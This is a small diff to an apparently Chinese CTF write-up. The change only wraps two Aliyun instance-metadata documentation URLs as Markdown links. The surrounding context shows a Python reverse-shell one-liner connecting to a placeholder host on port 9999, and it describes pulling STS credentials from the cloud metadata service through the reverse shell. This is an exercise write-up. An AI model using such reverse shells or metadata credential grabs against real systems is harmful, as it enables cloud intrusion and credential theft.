@@ -1684,9 +1684,9 @@ import socket, os, _posixsubprocess; s=socket.socket(); s.connect(("xxxx",9999))
 
 题目名提示了也在`aliyun`​上，可以去找`aliyun`​的元数据在哪里
 
-https://developer.aliyun.com/article/1626332#:\~:text\=%E5%90%84%E5%A4%A7%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE,%EF%BC%9Ahttp%3A%2F%2F169.254.169.254%2F
+[链接1](https://developer.aliyun.com/article/1626332#:\~:text\=%E5%90%84%E5%A4%A7%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE,%EF%BC%9Ahttp%3A%2F%2F169.254.169.254%2F)
 
-https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata?spm\=a2c6h.12873639.article-detail.4.411f3ff64G0pqs
+[链接2](https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata?spm\=a2c6h.12873639.article-detail.4.411f3ff64G0pqs)
 
 这里直接在`ECS`​(反弹到的`shell`​)里面获取`sts`​
 
